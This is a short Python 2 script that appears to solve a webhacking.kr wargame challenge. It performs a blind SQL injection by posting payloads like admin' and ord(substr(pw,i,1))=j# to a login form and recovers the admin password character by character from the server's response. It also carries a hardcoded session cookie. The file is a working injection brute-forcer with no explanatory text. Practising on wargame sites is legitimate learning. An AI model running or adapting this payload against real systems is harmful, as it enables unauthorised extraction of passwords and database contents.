import requests
  

pw = '2a93a'
for i in range(len(pw)+1,33):
    for j in range(48,123):
        headers = {'Host': 'webhacking.kr',
           'Cookie': "PHPSESSID=dc90187da81e259ed268a24690253bd4"
          }
        url = 'http://webhacking.kr/challenge/bonus/bonus-2/index.php'
        data = {
            "uuid":"admin' and ord(substr(pw,"+str(i)+",1))="+str(j)+"#",
            "pw": ""
        }
        #data = "admin' and ord(substr(pw,"+str(i)+",1))="+str(j)+"#"
        req = requests.post(url, data=data, headers=headers)
        #print req.content
        print "%d , %s" % (i, chr(j))
    
        if ("Wrong password!" in req.content):
            pw = pw + chr(j)
            print "Found It!! =====> : "+chr(j)
            print "pw=====> :"+pw
            break
 
print "flag======>"+pw